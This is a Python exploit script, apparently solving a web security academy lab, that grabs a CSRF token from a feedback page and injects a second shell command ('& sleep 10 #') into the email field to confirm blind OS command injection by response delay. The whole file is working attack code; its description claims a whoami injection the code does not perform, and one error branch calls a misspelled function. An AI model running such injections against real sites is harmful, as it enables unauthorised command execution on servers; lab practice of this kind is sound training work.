#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import urllib.parse
import argparse
from bs4 import BeautifulSoup as bs
import gc


#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Setup Proxies to future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy OS Command Injection: Lab 1'
                                ,description="Description: Inject whoami command and retrieve the current user name"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()
url = args.url.rstrip('/')
s = requests.Session()

#####################
#    Functions      #
#####################
def get_csrf(url,s):
    print("[+] Trying to get the CSRF token")
    csrf_url = url+'/feedback'
    r = s.get(csrf_url,verify=False,proxies=proxies)
    try:
        csrf_token = bs(r.text,"html.parser").find("input", {'name':'csrf'})['value']
    except:
        csrf_token = "not found"
    return csrf_token

def delay_on_resp(url,s):
    feedback_url = url+"/feedback/submit"
    csrf = get_csrf(url,s)
    if csrf:
        email = 'p0g0n0%40p0g0n0.thm & sleep 10 #'
        print("[+] CSRF token retrieved successfully")
        data = {
                'csrf' : csrf,
                'name' : 'p0g0n0',
                'email' : email,
                'subject' : 'lizards',
                'message' : 'lizards stuff'
            }
        r = s.post(feedback_url, data=data, verify=False, proxies=proxies)
        if r.elapsed.total_seconds() >= 10:
            print("[+] Rocked the lab!")
            gc.collect()
            sys.exit(-1)
        else:
            print("[-] Something went wrong")
            gc.collect()
            sys.exit(-1)
    else:
        print("[-] Couldn't retrieve the CSRF Token")
        gc.collet()
        sys.exit(-1)

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage:\n\t{sys.argv[0]} -u <Lab's URL>")
        print(f"[+] Example:\n\t{sys.argv[0]} -u https://random-code.web-security-academy.net")
        gc.collect()
        sys.exit(-1)
    else:
        delay_on_resp(url,s)
    
#####################
#       Init        #
#####################
if __name__ == "__main__":
    main()